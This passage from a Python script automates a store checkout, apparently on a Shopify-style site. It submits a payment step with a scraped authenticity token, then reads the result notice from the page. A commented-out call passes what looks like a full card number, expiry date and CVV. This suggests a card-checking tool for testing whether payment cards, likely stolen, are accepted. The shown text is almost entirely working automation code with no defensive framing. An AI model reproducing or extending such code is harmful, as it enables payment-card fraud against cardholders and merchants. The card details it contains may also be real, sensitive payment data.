 data_4 = f'_method=patch&authenticity_token={token_3}&previous_step=payment_method&step=&s={id1}&checkout%5Bpayment_gateway%5D=37350408285&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Bdifferent_billing_address%5D=false&checkout%5Btotal_price%5D=1299&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=876&checkout%5Bclient_details%5D%5Bbrowser_height%5D=759&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=240'
    
 req9 = session.post(url=url,headers=headers_4,data=data_4)

 time.sleep(5)

 req10 = session.get(url=str(url) + '?from_processing_page=1&validate=true')

 texto_4 = req10.text

 response = find_between(texto_4,'<div class="notice__content"><p class="notice__text">','</p></div></div>')



 return response







#asyncio.run(main=auto_sho_async('5213504657925759','01','2024','848'))




